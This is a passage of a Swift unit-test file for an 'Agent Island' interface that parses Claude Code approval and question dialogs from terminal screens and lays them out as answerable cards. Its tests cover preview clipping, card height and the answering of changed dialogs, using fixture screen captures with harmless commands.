            p.preview = rowLayoutPreview + [widest + String(repeating: "x", count: extra)]
            let l = p.layout, s = size(l), bigger = CTFontCreateCopyWithAttributes(G.contextFont, s + 0.25, nil, nil)
            XCTAssertLessThan(s, 10, "\(extra)")
            XCTAssertGreaterThan(s, AgentCardLayout.previewFloor, "\(extra)")
            XCTAssertEqual(s.truncatingRemainder(dividingBy: 0.25), 0, "0.25 pt steps: \(extra)")
            XCTAssertTrue(G.fits(l.preview.last!, l.previewFont, w), "\(extra)")
            XCTAssertFalse(G.fits(l.preview.last!, bigger, w), "the largest step that fits: \(extra)")
            XCTAssertEqual(l.preview, p.preview, "nothing clipped above the floor: \(extra)")
        }

        let long = String(repeating: "0123456789", count: 15)
        p.preview = ["head", long, "tail"]
        let l = p.layout
        XCTAssertEqual(size(l), AgentCardLayout.previewFloor, "never under the floor")
        XCTAssertEqual(l.preview.count, 3, "clipped, not wrapped")
        XCTAssertEqual(l.preview[0], "head")
        XCTAssertEqual(l.preview[2], "tail")
        XCTAssertTrue(l.preview[1].hasSuffix("…"))
        XCTAssertTrue(long.hasPrefix(l.preview[1].dropLast()))
        XCTAssertGreaterThan(l.preview[1].count, 80, "cut where the width ends, not short of it")
        for r in l.preview { XCTAssertTrue(G.fits(r, l.previewFont, w), r) }
    }

    /// More rows than the context cap: the head and "… N more lines", as for context.
    func testPreviewBlockIsCappedWithAMarker() throws {
        var p = try prompt(rowLayoutScreen)
        p.preview = (1...14).map { "row \($0)" }
        XCTAssertEqual(p.layout.preview, (1...10).map { "row \($0)" } + ["… 4 more lines"])
        p.preview = (1...10).map { "row \($0)" }
        XCTAssertEqual(p.layout.preview, p.preview, "ten rows: no marker")
    }

    /// Exact height: the preview block counts as drawn, in its own line height.
    func testCardHeightCountsThePreviewBlock() throws {
        let p = try prompt(rowLayoutScreen), l = p.layout
        XCTAssertEqual(l.question.count, 3, "the whole question, wrapped")
        XCTAssertEqual(l.question.joined(separator: " "), rowLayoutQuestion, "broken at spaces, no word split")
        for r in l.question { XCTAssertTrue(G.fits(r, G.questionFont, G.cardInner), r) }
        XCTAssertEqual(l.caption.count, 1)
        XCTAssertEqual(l.context, ["☐ Row layout"])
        // 8 + 3 * 20 question + 20 caption + (14 + 8 + 6) chips + (7 * 12 + 8 + 6) preview + (2 options + jump) * 26 + 8 + 4
        let h: CGFloat = 8 + 3 * 20 + 20 + (14 + 8 + 6) + (7 * 12 + 8 + 6) + 3 * 26 + 8 + 4
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(p)), h)
        XCTAssertFalse(notched.listScrolls(rows: 3, cards: h), "a 3-row heading still fits the island with 3 rows")
        var none = p
        none.preview = []
        XCTAssertEqual(AgentIslandGeometry.cardHeight(.prompt(p)) - AgentIslandGeometry.cardHeight(.prompt(none)),
                       7 * 12 + 8 + 6 + 20, "the block in its own line height, and the caption row")
    }

    /// A digit in a preview form only moves the focus, so every option is off,
    /// "No…" too, with the preview caption; hidden characters still win.
    func testPreviewFormHasEveryOptionOffWithItsCaption() throws {
        var p = try prompt(rowLayoutScreen.replacingOccurrences(of: "2. Two lines, swapped", with: "2. No, two lines     "))
        XCTAssertEqual(p.options[1].style(first: false), .deny)
        let l = p.layout
        for o in p.options { XCTAssertFalse(l.isEnabled(o), o.label) }
        XCTAssertEqual(l.caption, [AgentCardLayout.previewCaption])
        p.preview = []
        XCTAssertTrue(p.layout.isEnabled(p.options[1]), "the same deny option without a preview")
    }

    // MARK: - #526 round 3: an Ask form's heading is its whole question

    /// An Ask form without a preview whose question wraps over 2 lines: both
    /// lines are the question, the chip line alone is context; the card wraps it.
    func testAskQuestionWrappedOverTwoLinesIsTheWholeHeading() throws {
        let screen = run7Screen.replacingOccurrences(of: "\nWhich color?\n",
                                                     with: "\nWhich color should the release banner use on the\n  dark theme?\n")
        let p = try prompt(screen)
        XCTAssertEqual(p.question, "Which color should the release banner use on the dark theme?")
        XCTAssertEqual(p.context, ["☐ Color"])
        XCTAssertEqual(p.layout.question.joined(separator: " "), p.question, "wrapped at a space")
        XCTAssertEqual(p.options.map { p.isEnabled($0) }, Array(repeating: true, count: 5))
        let f = FakeDch()
        f.screen = screen
        XCTAssertEqual(f.answer(2, expected: p), .sent)
    }

    /// No chip line, no join: a Bash form's line right above its question stays context.
    func testBashLineRightAboveTheQuestionStaysContext() throws {
        let screen = bashScreen.replacingOccurrences(of: "products\n\n Do you", with: "products\n Do you")
        XCTAssertNotEqual(screen, bashScreen)
        let p = try prompt(screen)
        XCTAssertEqual(p.question, "Do you want to proceed?")
        XCTAssertEqual(p.context, ["Bash command", "  rm -rf .build && swift build -c release",
                                   "  Clean and rebuild the release products"])
    }

    /// Lines moved from context into the question stay compared: two Ask forms
    /// differing only in the question's first wrapped line are different dialogs.
    func testAskFormsDifferingInTheFirstQuestionLineSendNothing() throws {
        let p = try prompt(rowLayoutScreen)
        let other = rowLayoutScreen.replacingOccurrences(of: "Which Agent Island row layout", with: "Which Agent Island bar layout")
        XCTAssertNotEqual(try prompt(other), p)
        let f = FakeDch()
        // Without a preview a digit would answer: a changed first line sends nothing.
        f.screen = run7Screen.replacingOccurrences(of: "\nWhich color?\n", with: "\nWhich color for\n  the banner?\n")
        let q = try prompt(f.screen)
        f.screen = run7Screen.replacingOccurrences(of: "\nWhich color?\n", with: "\nWhich shade for\n  the banner?\n")
        XCTAssertEqual(f.answer(1, expected: q), .changed)
        XCTAssertEqual(f.sent, [])
    }

    /// The operator's screenshot content (the row-layout question) on the
    /// island at UI scale 0.7, 0.85 and 1.0. The island is fixed-size, so the
    /// three must come out the same.
    @MainActor
    func testRendersThePreviewFormAtEachUIScale() throws {
        let saved = ThemeRuntime.scale
        defer { ThemeRuntime.scale = saved }
        let out = tempDir()
        var sizes: [CGSize] = []
        for scale in [0.7, 0.85, 1.0] as [CGFloat] {
            ThemeRuntime.scale = scale
            let name = "agent-island-card-preview-\(scale)"
            try render(name, alias: "row layout", card: AgentPrompt.card(screen: rowLayoutScreen), to: out)
            let image = try XCTUnwrap(NSImage(contentsOf: out.appendingPathComponent("\(name).png")))
            sizes.append(image.size)
        }
        XCTAssertEqual(Set(sizes.map { "\($0)" }).count, 1, "fixed-size island: \(sizes)")
        var wide = try prompt(rowLayoutScreen)
        wide.preview[2] += String(repeating: " [solution#20400]", count: 3)
        try render("agent-island-card-preview-clipped", alias: "wide preview", card: .prompt(wide), to: out)
    }
}

// MARK: - Real Claude Code 2.1.309 screens (QA #310 live pty probe)

// Copied verbatim from the probe's rendered screens (same shape as dch --read:
// trailing blanks trimmed, one grid row per line), cut to the dialog and a few
// lines above it. Raw strings: the commands carry a literal backslash-n.

/// S1 run-2: one-line Bash, 40x100.
private let run2Screen = #"""
  Running /usr/bin/true with qa310 argument
  ⎿  $ /usr/bin/true qa310

────────────────────────────────────────────────────────────────────────────────────────────────────
 Bash command
 Tip: auto mode handles these prompts for you — choose "switch to auto mode" below
 Run /usr/bin/true with qa310 argument
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 /usr/bin/true qa310
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 This command requires approval

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don’t ask again for: /usr/bin/true qa310 *
   3. Yes, and switch to auto mode · auto mode handles these prompts for you
   4. No

 Esc to cancel · Tab to amend
"""#

/// X1 run-13: multi-line Bash (an empty line, a wrapped long line), 3 options.
private let run13Screen = #"""
⏺ Printing two test lines with printf
  ⎿  $ /usr/bin/printf 'qa310 a\n'
     /usr/bin/printf '%s\n' qa310-long-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
     aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-end

────────────────────────────────────────────────────────────────────────────────────────────────────
 Bash command
 Tip: auto mode handles these prompts for you — choose "switch to auto mode" below
 Print two test lines with printf
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 │ /usr/bin/printf 'qa310 a\n'
 │
 │ /usr/bin/printf '%s\n' qa310-long-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 │ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-end
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 This command requires approval

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and switch to auto mode · auto mode handles these prompts for you
   3. No

 Esc to cancel · Tab to amend
"""#

/// S11 run-12: Write (create file).
private let run12Screen = #"""
⏺ Write(notes.txt)

────────────────────────────────────────────────────────────────────────────────────────────────────
 Create file
 notes.txt
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
  1 hello qa310
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 Do you want to create notes.txt?
 ❯ 1. Yes
   2. Yes, and switch to accept edits (auto-approve file edits and common file commands) for this
      session (shift+tab)
   3. No

 Esc to cancel · Tab to amend
"""#

/// S6 run-7: AskUserQuestion, one question.
private let run7Screen = #"""
❯ Use the AskUserQuestion tool to ask me 'Which color?' with options Red, Green, Blue
────────────────────────────────────────────────────────────────────────────────────────────────────
 ☐ Color

Which color?

❯ 1. Red
     Choose red
  2. Green
     Choose green
  3. Blue
     Choose blue
  4. Type something.
────────────────────────────────────────────────────────────────────────────────────────────────────
  5. Chat about this

Enter to select · ↑/↓ to navigate · Esc to cancel
"""#

/// S8 run-9: AskUserQuestion, two questions (tab bar).
private let run9Screen = #"""
❯ Use the AskUserQuestion tool once, with two questions in the same call: 'Which color?' (options
  Red, Green, Blue) and 'Which size?' (options Small, Medium, Large)
────────────────────────────────────────────────────────────────────────────────────────────────────
←  ☐ Color  ☐ Size  ✔ Submit  →

Which color?

❯ 1. Red
     Choose red
  2. Green
     Choose green
  3. Blue
     Choose blue
  4. Type something.
────────────────────────────────────────────────────────────────────────────────────────────────────
  5. Chat about this

Enter to select · Tab/Arrow keys to navigate · Esc to cancel
"""#

/// S7 run-8: AskUserQuestion multiSelect (checkboxes).
private let run8Screen = #"""
❯ Use the AskUserQuestion tool with multiSelect set to true to ask me 'Which colors?' with options
  Red, Green, Blue
────────────────────────────────────────────────────────────────────────────────────────────────────
←  ☐ Colors  ✔ Submit  →

Which colors?

❯ 1. [ ] Red
         Red
  2. [ ] Green
         Green
  3. [ ] Blue
         Blue
  4. [ ] Type something
     Submit
────────────────────────────────────────────────────────────────────────────────────────────────────
  5. Chat about this

Enter to select · ↑/↓ to navigate · Esc to cancel
"""#

/// S9 run-10: AskUserQuestion with previews.
private let run10Screen = #"""
❯ Use the AskUserQuestion tool to ask me 'Which layout?' with options Grid, List, Cards. Give every
  option a preview field containing a small 3-line ASCII mockup of that layout.

────────────────────────────────────────────────────────────────────────────────────────────────────
 ☐ Layout

Which layout?

❯ 1. Grid                         ┌──────────────────────────────────────────┐
  2. List                         │ +------+------+------+                   │
  3. Cards                        │ | item | item | item |                   │
                                  │ +------+------+------+                   │
                                  └──────────────────────────────────────────┘

                                  Notes: press n to add notes

────────────────────────────────────────────────────────────────────────────────────────────────────
  Chat about this

Enter to select · ↑/↓ to navigate · n to add notes · Esc to cancel
"""#

/// #526: the operator's AskUserQuestion with option previews, laid out as Claude
/// Code 2.1.309 draws its preview form (component c9 in its bundle): options
/// in a 30-cell column, a 4-cell gap, the focused option's preview boxed
/// (top-left corner on option 1's row, rows padded to one width), "Notes:" one
/// row under the box, the rule, an unnumbered "Chat about this", its own footer.
/// Box content from the operator's report; 110 columns.
private let rowLayoutScreen = #"""
⏺ Both layouts keep the PR chips; pick one.

──────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ☐ Row layout

Which Agent Island row layout should the PR change use? Both show up to 3 PR chips (without the org name)
before "+N pending PRs".

❯ 1. PR line (Recommended)        ┌────────────────────────────────────────────────────────────────────┐
  2. Two lines, swapped           │ ✳  sec-1  [+3 agents]                              0s              │
                                  │    Working  sec-branch…   39/64 done · 3 in progress · 22 queued   │
                                  │    [cde-codebase#370] [solution#20399] [+2 pending PRs]  66 merged │
                                  │                                                                    │
                                  │ ●  perf-1                                          15s             │
                                  │    Idle  solution-mast…   74/81 done · 2 in progress · 5 queued    │
                                  │    [account-data-service#13509] [solution#20399]   63 merged       │
                                  └────────────────────────────────────────────────────────────────────┘

                                  Notes: press n to add notes

──────────────────────────────────────────────────────────────────────────────────────────────────────────────
  Chat about this

Enter to select · ↑/↓ to navigate · n to add notes · Esc to cancel
"""#

/// QA #310 fx-e-offtop-short-rule-ask: an Ask form whose top rule scrolled off,
/// with a short rule in its question (F1).
private let offTopShortRuleAsk = """
Delete the production database?
────────────
Harmless note
Which deployment target?

❯ 1. Production
     Live customer traffic, needs a release tag
  2. Staging
     Pre-release environment
  3. Local only
     Docker compose on this Mac
  4. Preview
     A throwaway per-branch deploy
  5. Type something.
──────────────────────────────────────────────────────────────────────────────────────────
  6. Chat about this

Enter to select · ↑/↓ to navigate · Esc to cancel
"""

/// QA #325 run-6: a live Claude Code 2.1.309 Write dialog 30 columns wide;
/// option 2 wraps "Yes, and switch to" / "accept edits", option 3 is overprinted.
private let run6Screen = #"""
           Claude Code
 ▐▛███▛█   v2.1.309
▝▜██████▀  Haiku 5.5
 ▝▝   ▝▝   Claude Team
           ~/…/project


❯ Use the Write tool to
  create the file notes.txt
  in the current directory
  containing the single line:
  hello qa325

⏺ Write(notes.txt)

──────────────────────────────
 Create file
 notes.txt
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
  1 hello qa325
╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
 Do you want to create
 notes.txt?
 ❯ 1. Yes
   2. Yes, and switch to
      accept edits
      (auto-approve file edits
      and common file
      commands) for this
   3. Nossion (shift+tab)

 Esc to cancel · Tab to amend
"""#
